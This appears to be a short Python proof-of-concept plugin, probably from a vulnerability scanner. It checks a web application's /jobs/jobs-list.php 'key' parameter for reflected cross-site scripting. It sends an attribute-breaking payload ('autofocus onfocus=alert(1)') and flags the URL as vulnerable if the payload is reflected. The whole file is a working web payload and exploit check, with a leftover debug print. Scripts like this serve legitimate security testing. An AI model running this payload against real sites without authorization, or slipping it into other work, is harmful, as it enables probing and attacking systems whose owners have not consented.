# /jobs/jobs-list.php?key= 反射xss
import requests


class Exploit:

    def attack(self, url):
        payload = '/jobs/jobs-list.php?key=%22%20autofocus%20onfocus=alert%281%29%20style=%22%22'
        r = requests.get(url + payload)
        if "alert(1) style=" in r.text:
            print("aaaa {}".format(url))
        if r.status_code == 200 and '" autofocus onfocus=alert(1) style=' in r.text:
            return url + payload + " is Xss"
